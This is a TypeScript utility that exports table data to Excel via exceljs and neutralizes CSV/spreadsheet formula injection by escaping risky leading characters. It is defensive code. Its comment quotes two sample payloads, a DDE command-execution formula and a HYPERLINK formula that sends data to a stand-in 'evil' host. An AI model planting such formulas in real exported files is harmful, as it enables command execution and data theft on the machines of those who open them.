export interface ExcelExportOptions {
  /** File name WITHOUT the .xlsx extension. */
  filename: string;
  sheetName?: string;
  head: string[];
  rows: (string | number | null | undefined)[][];
}

/**
 * CSV / spreadsheet formula-injection neutralization (OWASP "CSV Injection" /
 * CWE-1236). A cell whose text begins with = + - @ TAB or CR is interpreted as
 * a formula by Excel / LibreOffice / Google Sheets when the file is opened, so
 * operator-supplied strings (filter names, remarks, deviation reasons) that flow
 * verbatim into these exports and land on a reviewer's / auditor's workstation —
 * e.g. `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/"&<exfil>)` — would run.
 *
 * Prefix a single quote (Excel's recognized "treat as literal text" escape).
 * Non-strings pass through so numbers keep their type. This is the deliberate
 * twin of the backend `lib/spreadsheet-safe.ts` neutralizeFormula — the two live
 * on opposite sides of the api/web boundary and cannot share a module; keep the
 * FORMULA_TRIGGER regex identical in both. Added 2026-08-18 (VAPT-1): the
 * client-side export path was the one export that never got this guard.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

function neutralizeCell(c: string | number | null | undefined): string | number {
  if (c == null) return '';
  if (typeof c === 'number') return c;
  const s = String(c);
  return FORMULA_TRIGGER.test(s) ? `'${s}` : s;
}

/**
 * Export a single-sheet .xlsx from a header row + body rows (the same
 * `head` / `body` shape pages already build for their PDF table). Column
 * widths auto-fit to content. Downloads immediately.
 *
 * Uses `exceljs` via a dynamic import so the (large) workbook writer only
 * loads as its own chunk when a user actually clicks Export — no cost to the
 * initial bundle. Replaces SheetJS `xlsx@0.18.5`, which carries an unpatchable
 * prototype-pollution + ReDoS advisory on the npm registry (SheetJS ships fixed
 * builds only via its own CDN, so `npm audit fix` cannot resolve it).
 */
export async function exportToExcel({ filename, sheetName = 'Report', head, rows }: ExcelExportOptions): Promise<void> {
  const ExcelJS = (await import('exceljs')).default;
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet(sheetName.slice(0, 31));

  // Column widths auto-fit from the longest cell in each column (clamped),
  // matching the previous SheetJS behavior. Set before adding rows.
  ws.columns = head.map((h, i) => {
    const longest = Math.max(
      String(h).length,
      ...rows.map((r) => String(r[i] ?? '').length),
    );
    return { width: Math.min(Math.max(longest + 2, 8), 60) };
  });

  // Header cells are developer-defined column labels, but neutralize them too —
  // it is free and keeps a single rule for the whole sheet.
  ws.addRow(head.map(neutralizeCell));
  for (const r of rows) {
    ws.addRow(r.map(neutralizeCell));
  }

  const buffer = await wb.xlsx.writeBuffer();
  const blob = new Blob([buffer], {
    type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
  });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = `${filename}.xlsx`;
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}
